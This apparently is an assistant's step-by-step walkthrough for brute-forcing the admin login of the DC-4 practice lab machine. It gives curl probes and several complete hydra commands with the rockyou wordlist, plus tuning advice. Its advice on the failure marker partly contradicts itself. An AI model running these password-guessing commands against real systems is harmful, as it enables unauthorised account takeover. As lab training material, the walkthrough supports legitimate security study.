For customs forms, inspect the login form:
```
curl -s -X POST -d "username=admin&password=wrongpass&submit=Login" http://10.50.10.62/login.php | head -50
```

if you get a empty return:
```
┌──(root㉿kali)-[~/dc-4] └─# curl -s -X POST -d "username=admin&password=wrongpass&submit=Login" [http://10.50.10.62/login.php](http://10.50.10.62/login.php) 
<html>
 <head>
  <title>System Tools</title>
   <link rel="stylesheet" href="css/styles.css">
 </head> 
 <body>
  <div class="container">
   <div class="inner"> </div> 
  </div> 
 </body> 
</html>
```

Empty Page on Failure — Use That As the Signal

The failed login returns a tiny stub page — basically an empty container with the title "System Tools". No error message, just no content. That's actually useful because a successful login won't return this exact response — it'll redirect to `command.php` or similar.

The trick: use what IS in the failed response

The failed response contains `System Tools` in the title. A successful login redirects elsewhere and won't contain this. So use it as the failure indicator:
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.50.10.62 http-post-form "/login.php:username=^USER^&password=^PASS^&submit=Login:F=System Tools" -V
```

But wait — there's a gotcha. The login page itself (GET request) also contains "System Tools" in the title. If hydra follows the redirect on a successful login and lands somewhere that also has this title, you'd get false negatives. So we need to verify what success looks like, or use a more specific failure marker.

Better: use the specific empty-container HTML
The failed response has a very specific `<div class="inner"></div>` — an empty inner div. After a successful login (redirect to command.php), the response will be different. Try this more specific string:

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.50.10.62 http-post-form "/login.php:username=^USER^&password=^PASS^&submit=Login:F=class=\"inner\"" -V
```

The escaped quotes around `inner` are important since the F= value contains a double-quote character that needs escaping inside the bash double-quoted string.

Easier: use the title
`System Tools` only appears on the login page itself. Once you successfully log in and redirect to command.php (the post-login page on DC-4), that page has a different structure. The simplest reliable F= is:
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.50.10.62 http-post-form "/login.php:username=^USER^&password=^PASS^&submit=Login:F=System Tools" -V
```

If this gives false negatives (says "Login failed for everything" when one is actually correct), switch to the `inner` div approach above.

### Why your manual test was correct but grep returned nothing

Your curl output shows the response _is_ there — it's just a minimal page with no error words like "invalid," "wrong," etc. The page is a near-empty shell. The grep returned nothing because those error words don't appear. Now you know to use what IS present (`System Tools`, `class="inner"`) as the failure marker.

### Test it first with a known-bad combination

Before unleashing the full wordlist, sanity-check that hydra's parsing the form correctly. Run with a 5-password wordlist:

bash

```bash
echo -e "wrongpass1\nwrongpass2\nwrongpass3\nwrongpass4\nwrongpass5" > /tmp/test.txt
hydra -l admin -P /tmp/test.txt 10.50.10.62 http-post-form "/login.php:username=^USER^&password=^PASS^&submit=Login:F=System Tools" -V
```

You should see hydra cycle through all 5 attempts, all reported as failed. If hydra immediately reports "1 of 1 target successfully completed" with admin:wrongpass1 as valid, then F= is matching wrong — you have a false positive and need to refine the failure string.

If hydra reports all 5 as failed (expected), you're good. Run the real attack with rockyou.

### Run the real attack

bash

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.50.10.62 http-post-form "/login.php:username=^USER^&password=^PASS^&submit=Login:F=System Tools" -t 16
```

Drop `-V` since we know it's working — saves your terminal from drowning in output. With 16 threads, full rockyou (14 million entries) takes a while, but the DC-4 admin password is fairly early in the list. You should see a hit within several minutes.